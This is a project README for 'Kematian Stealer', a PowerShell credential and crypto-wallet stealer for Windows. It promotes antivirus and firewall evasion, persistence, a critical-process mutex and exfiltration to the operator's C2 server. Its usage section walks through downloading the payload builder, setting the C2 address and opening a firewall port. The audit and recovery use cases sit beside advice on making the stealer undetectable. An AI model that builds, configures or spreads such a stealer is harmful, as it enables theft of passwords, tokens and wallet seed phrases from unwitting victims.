# About The Project
Kematian Stealer is a [PowerShell-based](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-5.1) tool designed to effortlessly infiltrate and exfiltrate data from Windows systems. All information collected is transmitted via TCP to your C2 server, where everything is decrypted. It functions seamlessly across any `x64bit` system, from `Windows 10` or later, ensuring compatibility with the latest updates. With Kematian Stealer, you can retrieve `seed phrases, session files, passwords, application data, Discord tokens` and more.

This tool is particularly advantageous for accessing application and file data without restrictions, while evading conventional security measures such as `firewalls` and `antivirus` software, thanks to its `fileless capabilities`, which set it apart from other stealers. Upon execution, Kematian Stealer creates a `mutex` on the system and designates the process as `critical` before initiating data exfiltration, ensuring smooth and uninterrupted transmission of data.

Moreover, the tool has robust `persistence mechanisms` to remain active on the machine after reboot. Additionally, its user-friendly web-based `GUI builder` simplifies the process of creating payloads, enhancing its accessibility and usability.
<br>

# Use Cases

- **Security Audits**: For ethical hackers or system administrators to test the security and data exposure of local systems.
- **Data Recovery**: Assists in recovering lost passwords, cookies and other crucial data for legitimate purposes.

> [!TIP]
> Please refrain from opening issues related to detections, as it is pointless. This project's objective is to facilitate teaching and learning. If you need a FUD stealer, simply create one or REFUD it yourself. 

# Usage
## Setup Instructions And Video Guide Below 
<a href="https://devs.sped.lol/kematian-stealer"><img src="https://img.shields.io/badge/GitBook-6A6965?style=for-the-badge&logo=gitbook&logoColor=white"></a>

- Download [Builder](https://github.com/Pirate-Devs/Kematian/releases/download/AutoBuild/main.exe) from the releases.
- The builder will automatically generate your `private key` and `certificate` at first run, you can find them here `$env:appdata\Kematian-Stealer`
- After opening the builder, it will also start a local server which will run on `https://127.0.0.1:8080` by default.
- Open your web browser and go to `https://127.0.0.1:8080/builder`
- Input your C2 server in the `TCP TUNNEL URL:PORT` section
- Open the port in `Windows Firewall` for receiving logs 
```ps1
New-NetFirewallRule -DisplayName "KematianC2" -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow
```
- Next, activate the checkboxes for the features you want to include in the stub.
- Finally hit build and the output stub will be placed in the same folder with the builder
- Your logs will be saved here : `$env:appdata\Kematian-Stealer\logs`
 
 > [!NOTE]   
 > **THE DEBUG OPTION IS FOR TESTING PURPOSES ONLY**

### Configurations
